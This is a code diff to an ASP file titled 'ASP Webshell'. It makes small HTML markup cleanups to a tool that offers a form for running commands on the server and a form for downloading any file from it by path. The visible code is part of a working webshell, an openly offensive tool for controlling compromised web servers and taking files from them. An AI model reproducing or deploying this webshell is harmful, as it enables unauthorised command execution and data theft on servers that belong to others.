@@ -20,7 +20,7 @@ If downloadFile <> "" Then
     objStream.LoadFromFile(downloadFile)
     If Err.Number <> 0 Then
         objStream.Close()
-        downloadMsg = downloadMsg & "Error accessing file <code>" & Server.HTMLEncode(downloadFile) &"</code><br />"
+        downloadMsg = downloadMsg & "Error accessing file <code>" & Server.HTMLEncode(downloadFile) &"</code><br>"
         Err.Clear
     Else
         Response.ContentType = "application/octet-stream"
@@ -50,7 +50,7 @@ end sub
 <!DOCTYPE html>
 <html>
     <head>
-        <meta charset="UTF-8" />
+        <meta charset="UTF-8">
         <title>ASP Webshell</title>
         <style>
             body {
@@ -71,9 +71,9 @@ end sub
         </style>
     </head>
     <body>
-        <form id="cmdForm" method="POST" action="">
-            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
-            <input type="submit" value="Run" />
+        <form id="cmdForm" method="POST">
+            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox">
+            <input type="submit" value="Run">
         </form>
         <div class="infoText">
 <%
@@ -103,9 +103,9 @@ End If
             <div>
 <%= downloadMsg %>
             </div>
-            <form method="POST" action="">
-                <input type="text" name="downloadFile" placeholder="File to download" />
-                <input type="submit" value="Download" />
+            <form method="POST">
+                <input type="text" name="downloadFile" placeholder="File to download">
+                <input type="submit" value="Download">
             </form>
         </div>
         <script>
